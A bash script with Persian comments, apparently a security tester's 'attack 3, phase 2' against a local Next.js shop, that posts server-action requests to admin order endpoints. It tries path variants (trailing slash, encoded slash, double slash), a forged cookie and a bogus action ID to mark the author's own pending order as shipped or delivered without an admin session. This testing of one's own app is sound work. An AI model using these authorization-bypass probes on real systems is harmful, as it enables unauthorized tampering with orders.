#!/usr/bin/env bash
# حملهٔ ۳ فاز دوم — هدف: سفارش PENDING خودم (cmuie4mep0000ndr42f1jachp)
# آیا گذار DELIVERED/SHIPPED بدون نشست ادمین انجام می‌شود؟ + واریانت‌های مسیر
set -u
OUT="$(dirname "$0")/attack3-results2.txt"
: > "$OUT"
MYORDER="cmuie4mep0000ndr42f1jachp"
TRANS=40203364a06391be9688e5f6ed677454d4a174b9f4
SHIP=40e87d099172bb7cf7579728136cff36b2521ee0b8

probe() { # name url id body
  local name="$1" url="$2" id="$3" body="$4"
  {
    echo "## $name"
    curl -s -o /tmp/a3b.txt -w "http=%{http_code} ct=%{content_type} loc=%{redirect_url}\n" -X POST "$url" \
      -H "Next-Action: $id" -H "Content-Type: text/plain;charset=UTF-8" --data "$body"
    head -c 260 /tmp/a3b.txt; echo; echo "--"
  } >> "$OUT"
}

probe "A DELIVERED روی /admin/orders"           "http://localhost:3000/admin/orders"     "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]"
probe "B SHIPPED روی /admin/orders"             "http://localhost:3000/admin/orders"     "$SHIP"  "[{\"orderId\":\"$MYORDER\"}]"
probe "C /admin/orders/ (slash انتهایی)"        "http://localhost:3000/admin/orders/"    "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]"
probe "D /admin%2Forders"                       "http://localhost:3000/admin%2Forders"   "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]"
probe "E //admin/orders"                        "http://localhost:3000//admin/orders"    "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]"
probe "F /admin/orders (کوکی جعلی)"             "http://localhost:3000/admin/orders"     "$TRANS" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]" "prima_session= forged; x-forged=1"
probe "G id اکشن ناموجود روی /checkout"         "http://localhost:3000/checkout"         "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" "[{\"orderId\":\"$MYORDER\",\"to\":\"DELIVERED\"}]"
echo "=== ATTACK3 PHASE2 ==="
cat "$OUT"
